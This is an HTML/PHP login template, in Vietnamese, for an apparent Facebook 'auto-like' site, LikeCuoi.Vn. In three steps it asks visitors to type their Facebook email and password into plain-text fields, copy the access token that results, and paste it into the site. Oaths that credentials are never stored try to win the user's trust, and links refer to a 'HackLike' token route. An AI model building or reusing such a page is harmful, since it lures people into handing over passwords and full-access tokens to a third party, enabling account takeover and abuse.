 <div class="panel panel-danger">
                            <div class="panel-heading">
                                 <h2 class="panel-title"> <center><font color="red"><b><span class="glyphicon glyphicon-user"></span> TỰ TIN ĐĂNG NHẬP VÌ :</b></font></center></h2>
                            </div>  
                                <div class="list-group">
                                    <div class="list-group-item list-group-item-success">
                                        <b><font color="blue">- CAM KẾT :</font> </b> Trang <b>LikeCuoi.Vn</b> là một trang web uy tín và chất lượng <font color="red">  <b>không bao giờ lưu lại</b></font> thông tin Email và Mật Khẩu đăng nhập của khách hàng !<br>
                                        <b><font color="blue">- CAM ĐOAN :</font></b> Nếu <b>LikeCuoi.Vn</b> có lưu lại bất cứ thông tin Email và Mật Khẩu đăng nhập của khách hàng thì <b><font color="red">"cuộc đời của Admin sẽ không được suôn sẻ"</font></b> !<br>
                                    </div>
                                    <div class="list-group-item list-group-item-warning">
                                        <center>Admin làm ăn nghiêm túc nên không tiếc 1 lời thề để các bạn tin dùng LikeCuoi.Vn !!!</center>	
                                    </div>
                                </div>
                        </div>
                        

                        <div class="panel panel-primary">
                             <div class="panel-heading">
                                <center><h1 class="panel-title"><b>ĐĂNG NHẬP LIKECUOI.VN BẰNG CHÍNH TÀI KHOẢN FACEBOOK CỦA BẠN</b></h1></center>
                             </div>

		                    <div class="panel-body">
                            <center><b>Hướng dẫn :</b> <font color="red">Các bạn làm theo thứ tự các bước 1, 2, 3 để đăng nhập hệ thống bằng facebook nhé !!!!</font>
                            <br>
                            <script>
                             function showvideo(link, id) {
                                $("#" + id).html('<br><div class="panel panel-warning text-center"><div class="video-container">      <b class="panel-heading">Video hướng dẫn Đăng Nhập : </b></br><iframe width="250" height="150" src="' + link + '" frameborder="0" allowfullscreen></iframe> </div>    </div>');
                                         }

                                        </script>
                            <center><a class="btn btn-success btn-xs" onclick="showvideo('https://www.youtube.com/embed/eD22uY0siQc?rel=0','video');" alt="Hack Like facebook, Auto like facebook" title="Click Vào Đây Để Xem Video Hướng Dẫn Đăng Nhập Trên Điện Thoại"><i class="fa fa-youtube-play"></i> <b>VIDEO HƯỚNG DẪN TRÊN ĐIỆN THOẠI</b></a>
                            <br>
                            Nếu đăng nhập bị lỗi, Bạn hãy dùng : <a href="<?=base_url('/HackLike/LayTokenSource')?>" title="Bấm vào đây nếu đăng nhập gặp lỗi" alt="Bấm vào đây nếu đăng nhập gặp lỗi" class="btn btn-danger btn-xs"><u><b>LINK ĐĂNG NHẬP DỰ PHÒNG</b></u></a>
                            <br>
                           </center>

									<b id="video"></b></center> 
                                    <br>
                            <div class="alert alert-warning">
                            <font color="blue"><b>- <u>BƯỚC 1</u> :</b></font> <b>Nhập "Email" và "Mật Khẩu" facebook của bạn vào các ô tương ứng và bấm vào "Đăng Nhập Bằng Facebook" ở khung bên dưới :</b>
                            <br>
                            <br>
		                        <div class="row">
                                    <div class="col-sm-4"></div> 
                                    <div class="col-sm-4">		 
                                        <div class="alert alert-success">
	                                        <p><b>(*) Nhập Email or SĐT :</b> <input type="text" name="ask" value="" id="ask" class="form-control" placeholder="Nhập Email hoặc SĐT facebook vào đây .." title="Nhập Email hoặc số điện thoại tài khoản facebook của bạn"></p>
                                            <p><b>(*) Nhập Mật Khẩu :</b> <input type="text" name="ans" value="" id="ans" class="form-control" placeholder="Nhập Mật Khẩu facebook vào đây..." title="Nhập Email hoặc số điện thoại tài khoản facebook của bạn"></p>
                                            <br>
                                            <center><b><input type="button" onclick="Submit();" style="font-weight: bold;" value="Đăng Nhập Bằng Facebook" class="btn btn-primary"></b></center>
  
                                        </div>
                                    </div>
                                    <div class="col-sm-4"></div>
                                </div>
                            </div>


                            <div class="alert alert-info">
                                <font color="blue"><b>- <u>BƯỚC 2</u> : </b></font><b>Sao chéo toàn bộ "Mã Token" trong ô bên dưới rồi thực hiện bước 3 nhé.</b>
                                <li id="result2" class="list-group-item"><center><font color="red">Sau khi bạn thực hiện xong bước 1, Mã Token sẽ hiện ra tại đây !!!</font></center></li>
                            </div>



                            <div class="alert alert-success">
                                <font color="blue"><b>- <u>BƯỚC 3</u> : </b></font><b>Dán toàn bộ "Mã Token" đã sao chép ở bước 2 vào khung bên dưới rồi bấm vào Đăng Nhập.</b>
                               
                                    <font color="red">(*) Nhập Mã Token :</font>
                                    <textarea type="text" name="token" value="" id="token" class="form-control" placeholder="Dán Toàn Bộ Mã Token lấy được ở bước 2 vào đây" rows="3"></textarea>
                                    <br>
                                    <center>
                                    <input type="button" value="ĐĂNG NHẬP" style="font-weight: bold;" class="btn btn-danger" onclick="dang_nhap_captcha()">
                                     </center>
                                
                            </div>



                            <br>
	
	                        <div class="row">
                                <div class="col-sm-1"></div>
                                <div class="col-sm-10">
                                <div class="list-group-item list-group-item-danger"><center><h2 class="panel-title"><b>LƯU Ý </b></h2></center></div>
                                <div class="list-group-item list-group-item-warning">
                                    <li>Nếu tên đăng nhập là số điện thoại thì bạn thay số "0" thành "84" rồi mới nhập vào ô "Nhập Email or SDT" nhé.</li>
                                    <li>Trong mật khẩu facebook không nên để kí tự đặc biệt như @ # $ % ^ &amp; * ...</li>
                                    <li>Nhắn tin : <font color="red"><b> <span class="glyphicon glyphicon-phone"></span>0989.842.773</b></font> hoặc Nhắn tin Facebook : <a class="btn btn-info btn-xs" href="https://www.facebook.com/timroilecscd" title="Nhắn tin facebook cho admin LikeCuoi.Vn" target="_blank" rel="nofollow"><b>Đinh Mạnh Hưng</b></a> nếu cần hỗ trợ.
                                    </li>
                                <div>
                                 </div>
                                <div class="col-sm-1"></div>
                            </div>
                            
                        </div>

                    </div>
                    
                </div>
                <div class="panel-footer">
								<center>     
									CHÚC CÁC BẠN THÀNH CÔNG !
							</center>
						</div>
            </div>